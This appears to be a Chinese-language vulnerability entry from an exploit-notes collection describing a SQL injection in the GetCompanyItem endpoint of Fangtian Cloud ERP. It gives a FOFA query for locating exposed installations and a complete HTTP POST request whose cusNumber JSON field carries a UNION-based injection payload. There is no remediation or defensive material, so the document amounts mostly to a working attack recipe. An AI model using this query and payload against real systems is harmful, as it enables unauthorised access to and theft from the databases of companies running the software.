# 方天云ERP系统GetCompanyItem存在SQL注入漏洞

# 一、漏洞简介
方天软件以云ERP+MES产品为核心，整合设备层的工业数据，提供软硬件智能+整合方案服务，赋能数字工厂新智造。在模具制造、五金机械、塑胶成型、电子组装等行业成效显著，包括财富500强的企业也正在通过方天软件的综合管理方案而持续获益。方天云ERP系统GetCompanyItem存在SQL注入漏洞

# 二、影响版本
+ 方天云ERP

# 三、资产测绘
+ fofa`body="AjaxMethods.asmx/GetCompanyItem"`
+ 特征

![1721917258848-b78e31a2-e470-4ebe-99f8-ec99e64af05c.png](./img/YeZr3L9ppZ9Vc3mW/1721917258848-b78e31a2-e470-4ebe-99f8-ec99e64af05c-141307.png)

# 四、漏洞复现
```plain
POST /AjaxMethods.asmx/GetCompanyItem HTTP/1.1
Host: 
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Cookie: ASP.NET_SessionId=scc55sifm4qstcyuiswqqeqi
Upgrade-Insecure-Requests: 1
Priority: u=0, i
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:128.0) Gecko/20100101 Firefox/128.0
X-Requested-With: XMLHttpRequest
Content-Type: application/json

{"cusNumber":"' UNION ALL SELECT NULL,CHAR(113)+CHAR(113)+CHAR(113)+CHAR(118)+CHAR(113)+CHAR(112)+CHAR(67)+CHAR(77)+CHAR(115)+CHAR(70)+CHAR(73)+CHAR(116)+CHAR(80)+CHAR(87)+CHAR(71)+CHAR(120)+CHAR(69)+CHAR(70)+CHAR(120)+CHAR(74)+CHAR(82)+CHAR(109)+CHAR(97)+CHAR(84)+CHAR(66)+CHAR(100)+CHAR(78)+CHAR(119)+CHAR(110)+CHAR(66)+CHAR(103)+CHAR(74)+CHAR(69)+CHAR(84)+CHAR(107)+CHAR(109)+CHAR(119)+CHAR(121)+CHAR(113)+CHAR(120)+CHAR(70)+CHAR(101)+CHAR(102)+CHAR(101)+CHAR(122)+CHAR(113)+CHAR(122)+CHAR(106)+CHAR(106)+CHAR(113)-- cRcq"}
```

![1721917285475-ecb66d9f-28c3-4ac1-a9cf-edf4fc760ab8.png](./img/YeZr3L9ppZ9Vc3mW/1721917285475-ecb66d9f-28c3-4ac1-a9cf-edf4fc760ab8-788954.png)



> 更新: 2024-08-12 17:29:10  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/bh8s1goi997wx46g>